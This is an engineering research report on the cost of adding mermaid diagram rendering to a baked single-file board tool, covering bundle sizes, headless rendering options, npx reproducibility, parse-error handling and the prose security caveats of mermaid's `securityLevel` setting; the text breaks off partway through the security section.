# What mermaid costs, and whether bake time avoids it

Mermaid does not fit inside a baked board. `mermaid@11.17.0`'s shipped browser bundle is
3,572,296 bytes minified, 976,004 gzipped ([measured from the npm
tarball](https://registry.npmjs.org/mermaid), 2026-08-19), and a scratchboard board today is
437,856 bytes for a one-ticket board and 558,972 for this repo's own 41-ticket board (measured by
running `bin/cli.mjs --out`). Nothing in `serve.mjs` sets `Content-Encoding`, and the default path
opens the file over `file://`, so the raw number is the real number: shipping a runtime renderer
adds **8.2 one-ticket boards** of payload, taking a 437,856 byte board to 4,010,152 bytes, which
is **9.2 times its current size**. The two numbers answer different questions, so both are given:
8.2 is what the bundle costs, 9.2 is what the board becomes. Tree-shaking cannot cut that,
and mermaid's maintainers have said so since 2022. The only supported lever, `@mermaid-js/tiny`,
still costs 2,554,781 bytes, which is 5.8 boards. Baking to static SVG in Node does avoid the
payload entirely, and it genuinely works without a browser through `svgdom`, but that path drops
Node 18, which is scratchboard's declared floor. The path that keeps Node 18,
`@mermaid-js/mermaid-cli`, requires Puppeteer and roughly 1 GB of Chromium. Separately from size,
the security record is the harder blocker, and it is a record rather than a live exposure.
`mermaid@11.17.0` sits outside every affected range in section 6: the 2025 advisories are fixed in
11.10.0, CVE-2026-41148, CVE-2026-41149 and CVE-2026-41159 in 11.15.0, and CVE-2026-50159 and
CVE-2026-71437 in 11.16.1. Nothing listed fires in a current pin. What the table shows instead is
rate and reach: sixteen advisories, nine of them in 2026, four fixed inside two weeks, and seven
of them reachable from diagram text alone under the **default** `securityLevel: strict` at the
time they shipped. Mermaid also ships no render timeout as a general guarantee, which is why three
separate infinite-loop CVEs were possible, and the flowchart `img:` shape is unsanitized, so a
future renderer would turn a stranger's ticket into an outbound request from the bake machine and
a permanent beacon in every published board. Those last two are properties of adopting a renderer,
not of the escaped fence shipping today. My recommendation is in section 8: keep the existing fenced-code fallback,
which already renders `` ```mermaid `` blocks safely at zero bytes, and treat diagram rendering as
opt-in bake-time work behind a flag if it is wanted at all.

## 1. The denominator: what a board costs today

All four numbers below were measured on this repo at `main` by running the CLI, not estimated.

| Board | Raw bytes | gzip -9 |
| --- | ---: | ---: |
| One ticket, one lane (minimum shell) | 437,856 | 283,587 |
| This repo's `.scratch/`, 41 tickets, 4 lanes | 558,972 | 322,514 |
| `src/ui/board.js` (the whole renderer) | 49,745 | not measured |
| `src/ui/board.css` + `index.html` | 52,243 | not measured |

The shell is dominated by four woff2 fonts inlined as base64 data URLs, repeated once per
`@font-face` rule; `src/bake.mjs` line 93 does that inlining. Compression is not available to
soften a payload increase: `src/serve.mjs` has no `Content-Encoding` handling, and `src/open.mjs`
hands the file to the platform opener, so a board is read from disk uncompressed. Every size in
this document is therefore compared against **raw** bytes.

Two structural facts about the incumbent renderer matter to everything below. First,
`renderMarkdown` is called from exactly one place, `board.js` line 821, which fills the detail
drawer; cards do not render ticket bodies. So at most one ticket's diagrams are ever live at once.
Second, the current fenced-code path at `board.js` lines 193 to 200 discards the fence info string
entirely (`FENCE_RE` matches `\s*\S*\s*` without capturing it) and emits
`"<pre><code>" + esc(code.join("\n")) + "</code></pre>"`. There is no raw-HTML sink anywhere in
`renderInline` or `renderBlocks`: everything is escaped and then a fixed allowlist of inline tags
is spliced back in. `board.js` line 821 does assign that escaped output to
`el.detailBody.innerHTML`, so the sink itself already exists. What a diagram renderer would add is
the first path where markup scratchboard did not build itself, and did not escape, reaches that
sink.

## 2. What mermaid costs bundled, and what a subset saves

`mermaid@11.17.0` was published 2026-08-19 and reports `dist.unpackedSize` of 83,987,211 bytes,
of which about 69 percent is source maps. The artifact relevant to a single self-contained HTML
file is the IIFE, `dist/mermaid.min.js`, because it is the only build with no separate fetches.

| Artifact | Raw | gzip -9 | brotli -q11 |
| --- | ---: | ---: | ---: |
| `mermaid@11.17.0` `dist/mermaid.min.js` | **3,572,296** | **976,004** | 744,606 |
| `@mermaid-js/tiny@11.17.0` `dist/mermaid.tiny.js` | **2,554,781** | 673,090 | 512,966 |
| `mermaid` ESM entry only (`mermaid.esm.min.mjs`) | 30,255 | 11,156 | 9,667 |
| All 103 ESM chunks together | 3,491,470 | 961,959 | 733,248 |

The first two rows I re-measured directly from the npm tarballs; the rest come from the same
method. Source: [registry.npmjs.org/mermaid](https://registry.npmjs.org/mermaid),
[registry.npmjs.org/@mermaid-js/tiny](https://registry.npmjs.org/@mermaid-js/tiny).

The ESM entry being 30 KB is a trap. Mermaid does ship as 103 lazily-loadable chunks with 38
`import()` calls covering 36 diagram chunks, but a chunk is a network fetch, and a baked board
fetches nothing. Inlining the chunks is what produces the 3.4 MB figure.

### What is actually inside it

Attributed through the shipped source maps, the largest chunks are:

| Chunk | Minified bytes | What it is |
| --- | ---: | --- |
| `chunk-ZS6VBONO` | 705,086 | `@mermaid-js/parser`, the Chevrotain/Langium runtime |
| `chunk-ZJJ7VQJP` | 470,118 | cytoscape |
| `katex-CZ4GXH2S` | 272,628 | KaTeX |
| `chunk-QJSWEUOL` | 240,059 | config schema, themes, khroma, DOMPurify |
| `architectureDiagram` | 155,489 | one diagram type |
| `chunk-H7VHZCWX` | 120,482 | d3 plus dayjs |
| `sequenceDiagram` | 116,945 | one diagram type |
| `chunk-SPEABCGO` | 62,069 | flowchart, the type most people want |
| `chunk-R7JDMUKV` | 28,563 | dagre-d3-es, the layout engine |

Flowchart and sequence together are 179,014 bytes. The other 3.4 MB is machinery.

### Tree-shaking: no, and it is blocked by design

Three independent confirmations, none of them a guess:

1. `diagram-api/diagram-orchestration.ts` has 42 static top-level imports feeding one
   `registerLazyLoadedDiagrams(...)` call listing every diagram type, and `addDiagrams()` is
   called unconditionally from three sites in `mermaidAPI.ts`. No bundler can prove any entry
   unused. Source:
   [diagram-orchestration.ts](https://github.com/mermaid-js/mermaid/blob/develop/packages/mermaid/src/diagram-api/diagram-orchestration.ts).
2. `package.json` declares no `sideEffects` field. The PR that would have added it,
   [mermaid-js/mermaid#5872](https://github.com/mermaid-js/mermaid/pull/5872), was **closed
   unmerged on 2026-06-02**, because `import 'mermaid'` genuinely has a side effect (it renders
   `.mermaid` elements on load).
3. `registerExternalDiagrams` is additive only. Its first statement is `addDiagrams()`, which
   registers everything internal, and there is no `unregisterDiagram` and no allowlist parameter.
   Source: [mermaid.ts](https://github.com/mermaid-js/mermaid/blob/develop/packages/mermaid/src/mermaid.ts).

Measured with real esbuild builds that stub the internal chunks:

| Build | Raw | gzip | Saving vs full (gzip) |
| --- | ---: | ---: | ---: |
| Everything | 3,451,701 | 946,679 | baseline |
| Flowchart plus sequence, 34 diagram chunks stubbed | 1,928,766 | 554,273 | 41.4% |
| Plus dagre-only layout and no KaTeX | 979,043 | 260,368 | 72.5% |

The middle row still carries cytoscape, KaTeX, swimlanes, and cose-bilkent because the default
layout-loader registry statically enumerates `dagre`, `swimlanes`, and `cose-bilkent`, and the
core chunk dynamically imports KaTeX. Reaching the ~979 KB floor requires stubbing
content-hashed chunk filenames such as `flowDiagram-4D6TCV47.mjs`, which change every release.
That is not a maintainable technique, it is a fork.

Mermaid says as much itself. [Issue #2920](https://github.com/mermaid-js/mermaid/issues/2920),
open since 2022-04-10, asks for exactly this subset build. Maintainer aloisklink's 2023-07-13
answer: "you can do this manually by editing
`packages/mermaid/src/diagram-api/diagram-orchestration.ts`, then running `pnpm run build`. I
just tried this with deleting every diagram except `flowchartv2`, and the `mermaid.min.js` file
went from 2.8 MiB to only 444 KiB." The tracking issues for a real package split,
[#4120](https://github.com/mermaid-js/mermaid/issues/4120) (open since 2023-02-21) and its 2026
restatement [#7556](https://github.com/mermaid-js/mermaid/issues/7556), have never shipped.

### The one supported lever

`@mermaid-js/tiny@11.17.0` is a zero-dependency self-contained IIFE, so it is directly inlineable.
It removes mindmap, architecture, KaTeX rendering, and lazy loading, per its
[README](https://github.com/mermaid-js/mermaid/blob/develop/packages/tiny/README.md), which also
says "This package is not meant to be installed directly from npm. It is designed to be used via
CDN" and "it's always recommended to use the full mermaid library unless you have a very specific
reason to reduce the bundle size." The measured saving is 28.5 percent raw, not the 69.7 percent
its introducing PR [#4734](https://github.com/mermaid-js/mermaid/pull/4734) claimed in 2025. That
claim is stale.

### The trend is the wrong direction

`dist/mermaid.min.js` across releases, measured from the tarballs:

| Version | Published | Raw | gzip |
| --- | --- | ---: | ---: |
| 8.14.0 | 2022-02-10 | 1,106,746 | 298,776 |
| 9.4.3 | 2023-03-07 | 2,777,841 | 830,710 |
| 10.9.4 | 2025-08-20 | 3,336,822 | 990,331 |
| 11.0.0 | 2024-08-23 | 2,334,234 | 686,316 |
| 11.8.0 | 2025-07-03 | 2,705,166 | 778,197 |
| 11.17.0 | 2026-08-19 | 3,572,296 | 976,004 |

The v11 cut was real, about 30.7 percent, driven mainly by moving ELK out to
`@mermaid-js/layout-elk` ([#5049](https://github.com/mermaid-js/mermaid/pull/5049),
[#5654](https://github.com/mermaid-js/mermaid/pull/5654), motivated by EPL-2.0 licensing rather
than size). Since then 11.x has grown back 53 percent raw, and 11.17.0 is now larger than any 10.x
release. The earlier win, the dagre-d3-es migration in
[#3809](https://github.com/mermaid-js/mermaid/pull/3809), took `mermaid.js` from 2281.14 KiB to
1563.71 KiB, a 31.48 percent cut ([Shrinking Mermaid by more than
30%](https://www.sidharth.dev/posts/shrinking-mermaid/)). Every reduction has been eaten by new
diagram types. Note the asymmetry: ELK left, but cytoscape stayed, and cytoscape is still the
second-largest thing in the bundle at 470,118 bytes.

Planning against a future smaller mermaid is planning against eight years of evidence.

## 3. Static SVG at bake time, in Node, without a browser

Short answer: possible, proven working, and it costs Node 18.

### Plain Node and jsdom both fail, and jsdom fails dangerously

Measured on Node v22.18.0 with `mermaid@11.17.0`:

| Setup | Result |
| --- | --- |
| Plain Node, no DOM | `ReferenceError: document is not defined` |
| jsdom globals installed | `ReferenceError: CSSStyleSheet is not defined` |
| jsdom plus stubbed layout APIs | Renders, and the geometry is silently wrong |

The load-bearing constraint is SVG text measurement, and jsdom states its own position plainly in
its [README, "Unimplemented parts of the web
platform"](https://github.com/jsdom/jsdom#unimplemented-parts-of-the-web-platform): "Layout: the
ability to calculate where elements will be visually laid out as a result of CSS, which impacts
methods like `getBoundingClientRects()` or properties like `offsetTop`." On the `pretendToBeVisual`
option it adds "jsdom still does not do any layout or rendering, so this is really just about
pretending to be visual." Measured on a jsdom `SVGElement.prototype`, both `getBBox` and
`getComputedTextLength` are `undefined`, not stubs returning zero.

The failure mode when you fake them is the dangerous part. With `getBBox` stubbed to a constant
100x20, mermaid rendered two very different flowcharts to the **same** viewBox, `-8 -8 116 36`,
where real Chromium produced `0 0 91.875 174` and `0 0 276 222`. Mermaid does not crash on a bad
measurement shim, it emits a diagram whose boxes do not fit their text. A build that reports
success produces garbage. Mermaid's own docs offer no Node path at all
([usage](https://mermaid.js.org/config/usage.html)), and
[issue #3650, "Server Side Support"](https://github.com/mermaid-js/mermaid/issues/3650), has been
open since 2022-10-12.

### The genuinely browser-free path: svgdom

[svgdom](https://github.com/svgdotjs/svgdom) implements `getBBox` with fontkit against real font
files. Its README: "In order to calculate bounding boxes for text the font needs to be loaded
first. `svgdom` loads `Open Sans-Regular` by default when no font file for the specified font was
found." The recipe is [mermaid issue #6634](https://github.com/mermaid-js/mermaid/issues/6634),
filed 2025-06-07, still open, labelled "Status: Approved."

The published recipe is broken today: verbatim, it fails on mermaid 11.17.0 with
`ReferenceError: CSSStyleSheet is not defined`, and `isomorphic-mermaid@0.1.1`, which packages
that script, fails identically. Copying eight globals from jsdom (`CSSStyleSheet`,
`CSSStyleDeclaration`, `StyleSheet`, `MutationObserver`, `getComputedStyle`, `DOMParser`,
`XMLSerializer`, `NodeFilter`) makes both work. With that patch, measured:

- 10 of 12 diagram types render. **gantt fails** (`Cannot read properties of undefined (reading
  'offsetWidth')`) and **mindmap fails** (`canvas.getContext is not a function`).
- 121 ms first render, then **28 ms per diagram**.
- 190 MB of `node_modules`, 164 packages.
- Output is self-contained: no `foreignObject`, no `<script>`, no external URLs beyond XML
  namespace identifiers.

The fidelity gap is real and quantified. svgdom ships one font, `OpenSans-Regular.ttf`, while
mermaid's default `fontFamily` is `"trebuchet ms", verdana, arial, sans-serif`, so measurement
falls through to Open Sans metrics. Against Chromium on identical input, svgdom came out **12
percent wide on a short label and 39 percent wide on a long one**. The error direction is benign
(boxes too large, text still fits) and it is deterministic across machines. Closing the gap means
shipping a font file and calling `setFontDir` and `setFontFamilyMappings`.

**This path drops Node 18, and that is not negotiable.** Measured `engines.node`:

| Package | `engines.node` | Node 18 |
| --- | --- | --- |
| `jsdom` | `^22.22.2 \|\| ^24.15.0 \|\| >=26.0.0` | no |
| `svgdom` | `>=22.13.0` | no |
| `isomorphic-mermaid` | `>=22` | no |
| `puppeteer` | `>=22.12.0` | declared no |
| `@mermaid-js/mermaid-cli` | `^18.19 \|\| >=20.0` | yes |
| `beautiful-mermaid` | none declared | yes |

The svgdom stack fails on Node 18 in practice, not just by declaration: `ERR_REQUIRE_ESM` from
jsdom. And jsdom cannot be dropped to restore Node 18, because without it DOMPurify attaches to
svgdom's window and sanitizes the entire diagram away, producing an SVG of **length 0**. Issue
#6634 notes the same thing. scratchboard declares `"engines": { "node": ">=18" }` and its CI matrix
is 18, 20, 22, so this path is closed unless the floor moves.

### Everything else that claims to be headless is hiding a browser

| Option | Avoids a browser engine | What it runs |
| --- | --- | --- |
| `@mermaid-js/mermaid-cli` | no | Puppeteer plus local Chromium |
| `mermaid-isomorphic` | no | Playwright plus Chromium, installed separately |
| Kroki | no | Puppeteer plus Alpine Chromium in a companion container |
| mermaid.ink | no | Koa plus Puppeteer on someone else's server |
| jsdom plus mermaid | yes, but the output is wrong | no layout, geometry is fabricated |
| svgdom plus mermaid | **yes, genuinely** | fontkit metrics, no browser |
| `@viz-js/viz`, `@hpcc-js/wasm-graphviz` | **yes, genuinely** | Graphviz in wasm, but not mermaid syntax |

Details, each verified from the primary source. `mermaid-isomorphic@3.1.0` declares
`peerDependencies: { playwright: "1" }` and line 4 of
[src/mermaid-isomorphic.ts](https://github.com/remcohaszing/mermaid-isomorphic/blob/main/src/mermaid-isomorphic.ts)
is `import { chromium } from 'playwright'`. Kroki's
[configuration docs](https://github.com/yuzutech/kroki/blob/main/docs/modules/setup/pages/configuration.adoc)
say "Mermaid, Excalidraw and diagrams.net render diagrams in a headless Chromium instance driven
over the Chrome DevTools Protocol (CDP)", and its
[mermaid Dockerfile](https://github.com/yuzutech/kroki/blob/main/mermaid/Dockerfile) does
`apk add chromium`. [mermaid.ink's Dockerfile](https://github.com/jihchi/mermaid.ink/blob/main/Dockerfile)
is `FROM ghcr.io/puppeteer/puppeteer:25.7.0`; it has no documented terms of use and no rate
limits, both `/terms` and `/privacy` return 404, and its server queue defaults to
`QUEUE_CONCURRENCY=1`. Calling it at bake time would send every ticket's diagram source to a third
party on every build and make the build non-hermetic, which is disqualifying for a tool whose
pitch is that it installs nothing and phones nowhere.

### The Puppeteer path, priced

`@mermaid-js/mermaid-cli@11.16.0` (published 2026-06-29) declares
`peerDependencies: { puppeteer: '^23 || ^24 || ^25' }` with no `peerDependenciesMeta` marking it
optional. Its own `dist.unpackedSize` is only 52,022 bytes; the cost is entirely downstream.
`src/index.js` line 8 is `import puppeteer from "puppeteer"` and line 862 is
`browser ??= await puppeteer.launch(puppeteerConfig)`. Puppeteer's
[README](https://github.com/puppeteer/puppeteer#installation) states `npm i puppeteer # Downloads
compatible Chrome during installation`, and its
[configuration guide](https://pptr.dev/guides/configuration) confirms `skipDownload: false` is the
default and that browsers land in `~/.cache/puppeteer`.

Measured footprint:

| Item | Size |
| --- | ---: |
| `node_modules` for mermaid-cli plus puppeteer | 460 MB, 321 packages |
| Chromium 152.0.7977.42 on disk | 356 MB |
| `chrome-headless-shell` 152.0.7977.42 on disk | 194 MB |
| **Total** | **about 1.01 GB** |

Download sizes taken from `Content-Length` on the endpoints listed by the
[official Chrome for Testing known-good-versions API](https://googlechromelabs.github.io/chrome-for-testing/):
`chrome-linux64.zip` 185.0 MB, `chrome-headless-shell-linux64.zip` 113.9 MB,
`chrome-mac-arm64.zip` 179.0 MB.

Measured render time: 0.97 s for a single diagram from a cold process, 2.18 s for 10 diagrams in
one `mmdc` invocation (0.22 s each), and 5.34 s for 10 separate invocations (0.53 s each). Browser
launch dominates, so batching is worth about 2.4x. The Chromium download can be skipped and
cached, and mermaid-cli documents both routes in
[docs/already-installed-chromium.md](https://github.com/mermaid-js/mermaid-cli/blob/master/docs/already-installed-chromium.md):
`PUPPETEER_SKIP_DOWNLOAD=1` at install, and `mmdc --puppeteerConfigFile` with an `executablePath`,
carrying the caveat "Puppeteer is only guaranteed to work with the bundled Chromium, so use this
setting at your own risk." One CI trap worth knowing: Puppeteer's README warns that modern package
managers block install scripts by default (see [npm RFC 868](https://github.com/npm/rfcs/pull/868)),
so the browser is not downloaded and you get a runtime error instead; recovery is a separate
`npx puppeteer browsers install`.

## 4. Smaller renderers

Every row measured as a real esbuild browser bundle, gzip -9 and brotli -q11.

| Library | Version, last publish | Raw | gzip | Headless | Scope |
| --- | --- | ---: | ---: | --- | --- |
| railroad-diagrams | 1.0.0, 2022-06-25 | not measured | 4,529 | yes | grammar railroads, JS constructor API, no DSL |
| js-sequence-diagram (Snap fork) | mirror 2.0.1, 2022 | not measured | 9,030 | no | sequence only |
| nomnoml plus graphre | 1.7.0, 2024-12-14 | not measured | about 26,804 | **yes** | UML family, no sequence diagram |
| flowchart.js plus raphael | 1.18.0, 2023-12-08 | not measured | 41,640 | no | flowcharts only |
| svgbob-wasm | 1.0.0, 2022-05-19, third party | not measured | 152,987 | yes | ASCII art in, no layout engine |
| **beautiful-mermaid** | 1.1.3, 2026-02-26 | **1,632,063** | 491,476 | **yes** | **mermaid syntax**, 6 families |
| @viz-js/viz | 3.29.0, 2026-08-05 | not measured | 479,573 | yes | DOT only, best layout quality |
| **@mermaid-js/tiny** | 11.17.0, 2026-08-19 | **2,554,781** | 673,090 | no | mermaid minus mindmap, architecture, KaTeX |
| **mermaid** | 11.17.0, 2026-08-19 | **3,572,296** | 976,004 | no | 36 diagram types |
| @plantuml/core plus viz | 1.2026.6, 2026-06-08 | not measured | about 1,992,196 | yes | full PlantUML, 2.0x mermaid |
| @d2lang/d2 browser | 0.1.33, 2026-08-07 | not measured | 6,024,322 | yes | D2, 6.2x mermaid |

The small ones are small because they solve less, and most are unmaintained:

- **js-sequence-diagrams is dead.** Last commit 2022-07-29, and there is an open issue titled
  ["Is this project dead?"](https://github.com/bramp/js-sequence-diagrams/issues/231). The npm
  name was version-spammed in 2019 and now holds only npm's `0.0.1-security` placeholder, so
  [it is not installable](https://github.com/bramp/js-sequence-diagrams/issues/214). Only
  third-party forks work. It pulls Raphael and Snap.svg and underscore and lodash, and has no
  alt, opt, or loop blocks.
- **flowchart.js** ([adrai/flowchart.js](https://github.com/adrai/flowchart.js)) is alive but
  slow: last npm publish 2023-12-08, last commit 2026-01-15. The npm tarball ships no browser
  bundle at all, `main` is a 247-byte CommonJS shim, and the bundle exists only in the repo's
  `release/`. It pins `raphael@2.3.0`.
- **nomnoml** is the standout on size: one zero-dependency runtime dep (`graphre`, the author's
  own dagre port), `renderSvg()` verified working in plain Node, repo active to 2026-05-30. But it
  is UML with its own bracket DSL and **no sequence diagram**.
- **svgbob has no official npm package** (registry 404). The only build is third-party
  `svgbob-wasm@1.0.0` from 2022, four years behind the Rust crate.
- **viz.js 2.x is deprecated** in favour of `@viz-js/viz@3.x`, which bundles Graphviz 15.1.1 with
  zero dependencies and inlines the wasm as a JS string, so it needs no second fetch. It is
  genuinely usable in one HTML file and genuinely headless: Graphviz never asks a rendering
  engine, it falls back to `estimate_textspan_size` with hard-coded per-font width tables, which
  the viz-js author confirms in
  [mdaines/viz-js#82](https://github.com/mdaines/viz-js/issues/82): "Viz.js doesn't include
  fontconfig or have access to any system fonts, so Graphviz must fall back on its own metrics."
  Only Times, Arial, Helvetica and Courier are honoured. It is not mermaid syntax.

### Is anything smaller that reads mermaid syntax

One thing, and the honest saving is 2x, not 10x:
[beautiful-mermaid](https://github.com/lukilabs/beautiful-mermaid) 1.1.3, from Craft Docs, a
reimplementation of a mermaid subset with no mermaid dependency.

Measured independently by two agents with matching results:

| Build | Raw | gzip |
| --- | ---: | ---: |
| Full browser bundle, elkjs inlined | 1,632,063 | 491,476 |
| elkjs treated as external | 163,563 | 50,464 |
| elkjs stubbed | 94,095 | 28,598 |

The elkjs dependency is load-bearing, proved rather than assumed: `src/elk-instance.ts` uses a
**static** `from "elkjs/lib/elk.bundled.js"` and the dist has zero dynamic imports, so no bundler
can drop it. With elkjs stubbed, sequence diagrams still rendered while flowchart, class, and er
all threw. So the widely quoted "50 KB" build only ever renders sequence diagrams. Against
mermaid's 976,004 gzip, the real bundle is exactly 2.0x smaller.

What it does give, verified by running it: it renders with **no DOM** (`typeof document ===
'undefined'` in plain Node, returning valid SVG where mermaid throws), works on Node 18 with
byte-identical output to Node 22, 3.9 ms per diagram after an 81 ms first render, 11 MB and 3
packages. It supports exactly flowchart, graph, sequenceDiagram, classDiagram, stateDiagram-v2,
erDiagram, and xychart-beta, and cleanly rejects 13 other headers with `Invalid mermaid header`.
No KaTeX, no click handlers, no `accTitle`/`accDescr` accessibility metadata. Measurement is a
heuristic character-width table, not font metrics.

Two facts disqualify it as-is. Its SVG embeds
`@import url('https://fonts.googleapis.com/css2?family=Inter...')`, which is an outbound request
on every page load and a direct violation of "a baked board fetches nothing." And it is a
33-commit project, last commit 2026-05-06, despite 10.9k stars.

Verified negatives, so nobody re-searches them: `mermaid-parser-bundle` gives an AST and no
renderer; `mermaid-rs-renderer` and `mermaid-ascii` have no npm or wasm build; `mermaid-lite`,
`tiny-mermaid`, `mermaid-tiny`, `mermaid-rs`, and `mermaid-renderer` do not exist on npm.

## 5. The `npx`-at-a-pinned-version escape hatch

The repo already does this: `.github/workflows` runs `npx --yes eslint@10.8.1 .` and
`npx --yes --package typescript@7.0.2 --package @types/node@18.19.130`. The mechanics matter,
because the pattern is weaker than it looks.

**Behaviour when absent.** [npm docs for npx](https://docs.npmjs.com/cli/v11/commands/npx): "If any
requested packages are not present in the local project dependencies, then they are installed to a
folder in the npm cache, which is added to the `PATH` environment variable in the executed process.
A prompt is printed (which can be suppressed by providing either `--yes` or `--no`)." Measured: in
CI there is no prompt regardless of `--yes`, because
[libnpmexec](https://github.com/npm/cli/blob/latest/workspaces/libnpmexec/lib/index.js) reads
`if (noTTY() || ciInfo.isCI) { log.warn(...) } else { input.read(...) }`. So `--yes` is cosmetic in
CI, and a mistyped package name is a silent install of a stranger's code at build time.

**Cache.** `<npm cache>/_npx/<hash>/`, confirmed in
[npm's config definitions](https://github.com/npm/cli/blob/latest/workspaces/config/lib/definitions/definitions.js)
(`flatOptions.npxCache = join(obj.cache, '_npx')`). The hash is the first 16 hex characters of
SHA-512 over the sorted raw spec strings, verified by reproducing it. Because the key is the raw
spec, `npx foo`, `npx foo@11`, and `npx foo@11.16.0` are three separate trees.

**Offline.** Measured, and this is the surprise: a fully warm, exactly pinned run against an
unreachable registry **still fails** with `ECONNREFUSED`, because `getManifest` in libnpmexec
hardcodes `preferOnline: true` after spreading `flatOptions`. Passing `--offline` explicitly does
work (1.01 s, exit 0). `--prefer-offline` does not help, for the same reason. Cold cache with no
network exits 1 with `npm error code ENOTCACHED ... cache mode is 'only-if-cached' but no cached
response is available`. A separate gotcha: `npm cache clean --force` does not clear `_npx`, because
[lib/commands/cache.js](https://github.com/npm/cli/blob/latest/lib/commands/cache.js) removes
`flatOptions.cache`, already resolved to `_cacache`; only `npm cache npx rm` clears `_npx`.

**Reproducibility, which is the crux.** Measured against a cold isolated cache with
`npx --yes @mermaid-js/mermaid-cli@11.15.0`, the cache entry npm wrote was
`{ "dependencies": { "@mermaid-js/mermaid-cli": "^11.15.0" }, ... }`. Note the **caret**, added to
an exact pin. The resolved tree:

| Package | Pinned as | Actually installed |
| --- | --- | --- |
| `@mermaid-js/mermaid-cli` | 11.15.0 | 11.15.0 |
| `mermaid` | transitive `^11.14.0` | **11.17.0** |
| `puppeteer` | peer `^23 \|\| ^24 \|\| ^25` | **24.43.1** |

A lockfile is written into the cache entry, so one machine is stable after its first run, but
there is no lockfile you can commit, and the graph is resolved fresh per machine and per date. Two
`_npx` entries on the same machine both pinned to mermaid-cli 11.16.0 carried puppeteer 25.3.0 and
25.6.0. **Pinning the top-level version buys a stable top-level version, not a reproducible
graph.** For eslint that is a tolerable risk on a check job. For a renderer whose output is baked
into a published artifact, it means the same ticket can produce different SVG on two machines, and
it means the security-sensitive package (mermaid itself, section 7) floats free of the pin.

**Cost of doing it with mermaid-cli.** Measured on a cold machine:

| | Cold npm cache, warm browser cache | Cold npm cache, cold browser cache |
| --- | ---: | ---: |
| Wall time | 21.6 s | **23.0 s** |
| `_npx` tree | 487 MB | 487 MB |
| Chromium downloaded | none | **546 MB** |

Puppeteer's install script does run under npx, and it downloads Chromium into `~/.cache/puppeteer`,
which is **outside the npm cache entirely** and invisible to `npm cache npx ls/rm`. So the escape
hatch that costs nothing for eslint costs roughly 1 GB and 23 seconds on a cold runner, across two
caches that must both be warmed. One more measured trap: `npx --yes @mermaid-js/mermaid-cli@11.16.0`
silently used a **globally installed** mmdc and fetched nothing, which matches the docs but makes
local testing of the cold path misleading.

The honest reading: the escape hatch is legitimate here in the same sense it is for eslint, because
no line lands in `package.json`. But it changes the product. Today `npx scratchboard` installs
nothing beyond scratchboard and works with no network after the first fetch. A bake step that
shells out to a renderer would fail closed on an offline machine or a cold cache, so it has to be
opt-in and it has to degrade to the existing fenced-code block rather than error.

## 6. What happens to a diagram that fails to parse

This is the one area where mermaid cooperates with the repo rule, provided it is configured for it.

`mermaid.parse(text, parseOptions)` is
[mermaidAPI.ts lines 86 to 103](https://github.com/mermaid-js/mermaid/blob/develop/packages/mermaid/src/mermaidAPI.ts).
It **throws by default** and returns `false` when given `{ suppressErrors: true }`. Per
[types.ts](https://github.com/mermaid-js/mermaid/blob/develop/packages/mermaid/src/types.ts),
`suppressErrors` also suppresses the `parseError` callback: "If `true`, parse will return `false`
instead of throwing error when the diagram is invalid. The `parseError` function will not be
called." **The `false` return carries no reason**, so `suppressErrors: true` is the wrong choice
for a rule that requires a path and a reason. Let it throw and catch.

On success, `ParseResult` is `{ diagramType: string, config: MermaidConfig }`. Both halves are
useful: `diagramType` tells you whether it is a type you support, and `config` is the effective
per-diagram config, so you can inspect what the ticket **tried** to set (`themeCSS`, `fontFamily`,
`dompurifyConfig`) and reject before rendering. But `parse` is not cheap type detection: it calls
`getDiagramFromText`, which fully constructs the `Diagram`, runs the grammar, and populates the DB.
Mermaid has a separate detector registry in `diagram-api/detectType.js` that matches the leading
keyword by regex without parsing, but that was not read in this pass, so treat "detectType is safe
on untrusted text" as unverified.

On render failure, mermaid draws a bomb-with-fuse "Syntax error" graphic from
`diagrams/error/errorRenderer.ts`. The kill switch is `suppressErrorRendering`, schema default
`false`, described in the config schema as "Suppresses inserting 'Syntax error' diagram in the
DOM. This is useful when you want to control how to handle syntax errors in your application." It
is in the `secure` array, so a diagram cannot re-enable the bomb. Critically, **even without it
`render` still throws**: the parse branch stashes `parseEncounteredException`, renders the error
diagram, serializes, and then rethrows at mermaidAPI.ts lines 642 to 644, discarding the SVG.
Setting `suppressErrorRendering: true` just makes it throw earlier.

So the mapping onto the repo rule is clean: `suppressErrorRendering: true`, catch, push
`{ path, reason }`, and fall back to the existing `<pre><code>` block so the reader still sees the
diagram source. That is strictly better than a bomb graphic, because a fenced block is readable
copy and a bomb is not.

One caveat on the reason string. Mermaid uses two grammar systems: Jison (`.jison` files) for the
older diagrams and Langium (`@mermaid-js/parser`) for `architecture`, `radar`, `treeView`, `info`,
`packet`, and `pie`. Jison conventionally produces `Parse error on line N:` with an excerpt, a
caret, and `Expecting <tokens>, got '<token>'`, which is why
[the usage docs](https://mermaid.js.org/config/usage.html) show `mermaid.parseError = function (err,
hash) {...}` taking a hash with `line` and `expected`. Langium produces differently shaped
diagnostics. **No actual message string was captured in this research.** Two error formats is the
likely reality, so do not promise the `reason` field a specific shape without running it.

The bigger problem is that a parse failure is the easy case. Section 7 covers the failure a
`try/catch` cannot survive.

## 7. The security position

Ticket markdown is untrusted and comes from a stranger's repo. A diagram renderer is a new parser
fed by that input, and mermaid's record against exactly this threat model is bad and not improving.

### `securityLevel` does not do what the docs say

The four values, from
[config.schema.yaml](https://github.com/mermaid-js/mermaid/blob/develop/packages/mermaid/src/schemas/config.schema.yaml)
(mirrored at [the config schema docs](https://mermaid.js.org/config/schema-docs/config.html)),
default `strict`:

| Value | Schema description |
| --- | --- |
| `strict` | default, "HTML tags in the text are encoded and click functionality is disabled" |
| `antiscript` | "HTML tags in text are allowed (only script elements are removed), and click functionality is enabled" |
| `loose` | "HTML tags in text are allowed and click functionality is enabled" |
| `sandbox` | "all rendering takes place in a sandboxed iframe" |

Two places where the source disagrees with that prose, both verified by reading it:

1. In `diagrams/common/common.ts`, `sanitizeMore` puts `strict` on the **same branch as
   `antiscript`**, a DOMPurify pass, not the entity-encoding branch. The entity-encoding branch is
   dead for all four documented values. So "HTML tags in the text are encoded" under `strict` is
   not what the code does.
2. `click X call fn()` is gated by `if (getConfig().securityLevel !== 'loose') { return; }` in
   `flowDb.ts` `setClickFun`, so callbacks are blocked in `strict`. But `click X href "..."` is
   **not gated on `securityLevel` at all**. `setLink` calls `utils.formatUrl`, which runs
   `sanitizeUrl` from `@braintree/sanitize-url`, and the renderer emits an
   `<svg:a xlink:href=...>` unconditionally. Under `strict`, mermaid still injects anchors into the
   baked file, protocol-filtered by a **different allowlist** from `board.js`'s `SAFE_HREF`.

